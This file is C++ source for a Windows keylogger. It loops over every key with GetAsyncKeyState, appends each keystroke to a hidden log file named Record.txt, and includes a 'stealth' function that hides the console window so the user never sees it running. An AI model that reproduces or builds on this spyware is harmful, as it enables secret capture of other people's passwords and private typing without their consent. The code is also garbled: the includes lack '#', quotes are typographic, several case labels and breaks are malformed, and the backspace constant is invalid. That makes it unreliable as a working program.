// C++ Keylogger Project 

// ( for (;;) creates an infinite loop)

include <iostream>
include <windows.h>
include <Winuser.h>
include <fstream>

void log()
int main()
{
    char key;
    for(;;)
    {
        for( key=8; key <=222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                ofstream write ( “Record.txt”, ios :: app);
                if ( ( key>64) && (key<91) && !(GetAsyncKeyState(0x10)) )
                {
                    key+= 32;
                    write << key;
                    write.close ();
                    break;
                }
                else if ((key >64) && (key<91))
                {
                    write << key;
                    write.close();
                    break;
                }
                else
                {
                    switch(key)
                    {
                        case 48: 
                        //ascii for 0
                        {
                            if (GetAsyncKeyState(0x10) )
                                write << “)”;
                            else
                                write << “0”;
                        }
                        break;
                        case 49 ;
                        {
                            if (GetAsyncKeyState(0x10) )
                                write << “!”;
                            else
                                write << “1”; 
                        }
                        break;
                        case 50 ;
                        {
                            if (GetAsyncKeyState(0x10) )
                                write << “\”;
                            else
                                write << “2”; 
                        }
                        break;
                        case VK_SPACE:   // virtual keys
                            write << "<Space>";
                        break;
                        case VK_RETURN:
                            write << "\n";
                        break;
                        case VK_TAB:
                            write<< "<Tab>"   // press tab button
                        break;
                        case VK_BACKSPACE:
                            write << "<Backspace>"; // backspace button
                        break;
                        case VK_ESCAPE:
                            write << "<Esc>"
                        break:
                        case VK_DELETE:
                            write<< "<Delete>";
                        break;
                    }
                }
                        
                        
            }
        }
        
      
    }
}
//function to hide keylogger console window 
void hide_logger ()
{
    HWND stealth; //creating a handler called stealth
    AllocConsole();
    stealth=FindWindowA(“ConsoleWindowClass”, NULL);
    ShowWindow(stealth,0); //0 means false so do not show the logger
}

